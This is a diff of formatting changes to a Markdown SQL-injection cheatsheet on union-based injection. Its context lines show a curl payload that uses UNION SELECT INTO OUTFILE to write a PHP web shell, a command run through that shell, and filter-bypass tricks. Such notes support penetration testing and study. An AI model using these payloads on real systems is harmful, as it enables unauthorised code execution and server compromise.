@@ -15,7 +15,7 @@ linked:
 ---
 # SQLi - Union based
 
-***
+---
 
 ## Cheatsheet
 
@@ -69,7 +69,7 @@ curl -s "$TARGET' UNION SELECT NULL,'<?=\`\$_GET[0]\`?>',NULL,NULL INTO OUTFILE 
 curl "https://target/shell.php?0=id"
 ```
 
-___
+---
 
 ## Overview
 
@@ -82,4 +82,4 @@ ___
 
 Si la app filtra `UNION` → probar `/*!UNION*/`, `UNIunionON`, case mixing, encoding. Si frontend NO refleja ninguna columna → pivotar a [[SQLi - Error based]] o blind.
 
-***
+---
